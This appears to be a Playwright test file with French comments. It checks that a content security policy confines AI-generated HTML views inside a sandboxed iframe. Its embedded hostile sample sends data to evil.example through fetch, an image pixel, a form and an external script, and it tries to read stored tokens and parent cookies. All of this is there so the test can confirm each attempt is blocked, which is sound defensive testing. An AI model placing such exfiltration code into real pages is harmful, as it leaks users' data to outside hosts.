import { expect, test } from '@playwright/test';

import { BIBLIOTHEQUES_ADMISES, avecPolitiqueDeContenu } from '../src/app/core/assistant/vues-libres';

/**
 * KAN-95 : preuve dans un vrai navigateur que la politique de contenu des vues libres tient. Le « code généré » ci-dessous
 * est hostile : il tente de sortir des données, de charger un script ou une image externe, de soumettre un formulaire et
 * de lire l'application. Il tourne dans une iframe `sandbox="allow-scripts"` (comme le moteur de CopilotKit) dont le
 * document porte la politique posée par `avecPolitiqueDeContenu`.
 */
const CODE_HOSTILE = `<html><head></head><body>
<form id="f" action="https://evil.example/collecte" method="post"><input name="d" value="salaires"><button id="b">ok</button></form>
<img src="https://evil.example/pixel.png?d=salaires">
<script>
  const rapport = { violations: [], inline: true };
  document.addEventListener('securitypolicyviolation', (e) => rapport.violations.push(e.violatedDirective.split(' ')[0]));
  (async () => {
    try { await fetch('https://evil.example/collecte', { method: 'POST', body: 'salaires' }); rapport.fetch = 'passe'; } catch { rapport.fetch = 'bloque'; }
    try { rapport.stockage = typeof localStorage.getItem('jeton'); } catch { rapport.stockage = 'interdit'; }
    try { rapport.parent = typeof parent.document.cookie; } catch { rapport.parent = 'interdit'; }
    const script = document.createElement('script');
    script.src = 'https://evil.example/x.js';
    document.head.appendChild(script);
    const admise = document.createElement('script');
    admise.src = '${BIBLIOTHEQUES_ADMISES[0]}';
    document.head.appendChild(admise);
    document.getElementById('f').requestSubmit();
    await new Promise((r) => setTimeout(r, 800));
    parent.postMessage({ rapport }, '*');
  })();
</script></body></html>`;

test.describe('Vues libres : politique de contenu (KAN-95)', () => {
  test('le code généré ne sort aucune donnée et ne lit pas l\'application', async ({ page }) => {
    await page.goto('about:blank');
    const rapport = await page.evaluate(
      ([srcdoc]) =>
        new Promise<{ violations: string[]; inline: boolean; fetch: string; stockage: string; parent: string }>((resolve) => {
          window.addEventListener('message', (m) => resolve((m.data as { rapport: never }).rapport));
          const iframe = document.createElement('iframe');
          iframe.setAttribute('sandbox', 'allow-scripts');
          iframe.srcdoc = srcdoc;
          document.body.appendChild(iframe);
        }),
      [avecPolitiqueDeContenu(CODE_HOSTILE)]
    );

    expect(rapport.inline).toBe(true); // le script en ligne du moteur s'exécute
    expect(rapport.fetch).toBe('bloque');
    expect(rapport.stockage).toBe('interdit');
    expect(rapport.parent).toBe('interdit');
    expect(rapport.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src', 'script-src-elem']));
    // Le formulaire est déjà fermé par l'iframe elle-même (pas de `allow-forms`) ; `form-action 'none'` double ce verrou.
    // La bibliothèque admise n'a produit aucune violation : seules les deux adresses exactes passent.
    expect(rapport.violations.filter((v) => v === 'script-src-elem')).toHaveLength(1);
  });
});
